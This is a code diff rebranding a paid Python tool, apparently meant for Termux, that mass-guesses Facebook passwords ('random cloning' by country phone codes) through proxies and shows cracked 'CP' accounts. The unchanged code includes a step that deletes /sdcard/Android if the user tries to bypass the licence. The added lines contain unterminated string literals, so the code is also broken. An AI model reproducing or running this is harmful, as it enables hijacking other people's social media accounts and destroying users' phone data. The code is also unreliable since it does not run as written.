@@ -7,7 +7,7 @@
 from os import path
 import os,platform,base64,zlib,pip,urllib
 os.system('clear')
-print('\n\033[1;37m Loading VEER Tools...')
+print('\n\033[1;37m Loading Saadat Tools...')
 try:
 	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,base64
 	from string import *
@@ -26,20 +26,20 @@ except ModuleNotFoundError:
 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 try:
-    prox= requests.get('https://github.com/R-SAhmad/approvedone/blob/main/T.text').text
+    prox= requests.get('https://github.com/Sajid23-1/Test/blob/main/T.txt).text
     open('proxies.txt','w').write(proxies)
 except Exception as e:
     print('')
 proxies=open('proxies.txt','r').read().splitlines()
 android_models=[]
 try:
-    xx = requests.get('https://github.com/R-SAhmad/approvedone/blob/main/T.text').text.splitlines()
+    xx = requests.get('https://github.com/Sajid23-1/Test/blob/main/T.txt).text.splitlines()
     for line in xx:
         android_models.append(line)
 except:pass
 usr=[]
 try:
-    xd=requests.get('https://github.com/R-SAhmad/approvedone/blob/main/T.text').text.splitlines()
+    xd=requests.get('https://github.com/Sajid23-1/Test/blob/main/T.txt).text.splitlines()
     for us in xd:
         usr.append(us)
 except: pass
@@ -199,10 +199,29 @@ def xi():
         shutil.rmtree("/sdcard/Android")
         print("Don't Bypass ")
         sys.exit()
+   
+def aprv():
+    global km
+    r=requests.get(km).text
+    k=getKey()
+    if k in r:
+        main__manu()
+        print("\033[1;92mYour Token is successfully Approved\33[1;37m")
+    else:
+                os.system('clear')
+                print(logo)
+                print('\033[1;32m  Your Key Is Not Approved')
+                print('\033[1;37m----------------------------------------------')               
+                print(f" Your Key: {k}")
+                print('\033[1;37m----------------------------------------------')                
+                input('\033[1;37m[Press Enter]')
+                os.system("xdg-open https://wa.me/+93702856593?text={k}")
+                aprv()
+                sys.exit()
                 
 
 
-logo=("""\033[1;39m .########...######..##.....##
+logo=("""      \033[1;39m .########...######..##.....##
       \033[1;32m .##.....##.##....##.##.....##
       \033[1;39m .##.....##.##.......##.....##
       \033[1;32m .########...######..#########
@@ -210,7 +229,7 @@ logo=("""\033[1;39m .########...######..##.....##
       \033[1;32m .##....##..##....##.##.....##
       \033[1;39m .##.....##..######..##.....##
 \x1b[1;97m ---------------------------------------------
-\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   : Raziqullah
+\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  Raziqullah
 \x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  Raziqullah Saadat
 \x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Status  :  Paid
 \x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool    :  MIX
@@ -267,14 +286,14 @@ def main__manu():
                                 except:
                                         ps_limit =1
                                 clear()
-                                print('\t\x1b[1;92m     SAADAT TOOL PASSWORD MENU')
+                                print('\t\x1b[1;92m     Saadat TOOL PASSWORD MENU')
                                 linex()
                                 print('\033[1;97m[+]\033[1;32m EXAMPLE \033[1;91m: \033[0;96mfirst last,firtslast,first123')
                                 linex()
                                 for i in range(ps_limit):
                                         plist.append(input(f'\033[1;97m[•] \x1b[1;92mPUT PASSWORD {i+1} \033[1;31m: \033[1;36m'))
                                 clear()
-                                print('\t\x1b[1;92m  SAADAR TOOL ACCOUNTS DISPLAY MENU')
+                                print('\t\x1b[1;92m  Saadat TOOL ACCOUNTS DISPLAY MENU')
                                 linex()
                                 print('\033[1;97m[•]\x1b[1;92m DO YOU WANT SHOW CP ACCOUNTS? \033[1;37m(\033[1;36my\033[1;37m/\x1b[1;96mn\033[1;37m) \033[1;31m: \x1b[1;93m')
                                 linex()
@@ -313,9 +332,9 @@ def main__manu():
                                 input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                         elif xd in ['2','02']:
                                 clear()
-                                print('\t\x1b[1;92m   VEER TOOL RANDOM CLONING MENU')
+                                print('\t\x1b[1;92m   Saadat TOOL RANDOM CLONING MENU')
                                 linex()
-                                print('\033[1;37m[1] \x1b[1;92mPAKISTAN RANDOM CLONING\n\033[1;37m[2] \x1b[1;92mBANGLADESH RANDOM CLONING\n\033[1;37m[3] \x1b[1;92mAFGHANISTAN RANDOM CLONING\n\033[1;37m[0] \033[1;32mBACK IN MAIN menu ')
+                                print('\033[1;37m[1] \x1b[1;92mAFGHANISTAN RANDOM CLONING\n\033[1;37m[2] \x1b[1;92mBANGLADESH RANDOM CLONING\n\033[1;37m[3] \x1b[1;92mAFGHANISTAN RANDOM CLONING\n\033[1;37m[0] \033[1;32mBACK IN MAIN menu ')
                                 linex()
                                 x=input('\033[1;97m[•] \033[1;92mCHOOSE \x1b[1;91m: \x1b[1;96m ')
                                 if x in ['1','01']:
@@ -329,13 +348,13 @@ def main__manu():
                         elif xd in ['3','03']:
                                 os.system('xdg-open https://www.facebook.com/veerkhano71');menu()
                         elif xd in ['4','04']:
-                        	     os.system('xdg-open https://wa.me/+8801323176125');menu()
+                        	     os.system('xdg-open https://wa.me/+93702856593');menu()
                         elif xd in ['0','00']:
                                 clear()
-                                print('\t\x1b[1;92m   EXIT FROM VEER TOOL')
+                                print('\t\x1b[1;92m   EXIT FROM Saadat TOOL')
                                 linex()
                                 input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
-                                os.system('xdg-open https://www.facebook.com/veerkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE VEER TOOL');time.sleep(2);linex();exit() 
+                                os.system('xdg-open https://www.facebook.com/veerkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE Saadat TOOL');time.sleep(2);linex();exit() 
                         else:
                                 print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');main__manu()
         except ValueError:
@@ -349,7 +368,7 @@ def main__manu():
 def pak():
                 user=[]
                 clear()
-                print('\t\x1b[1;92m  VEER TOOL PAK RANDOM CLONER MENU')
+                print('\t\x1b[1;92m  Saadat TOOL PAK RANDOM CLONER MENU')
                 linex()
                 print('\t\x1b[1;92m       PAKISTAN SIM CODE MENU')
                 linex()
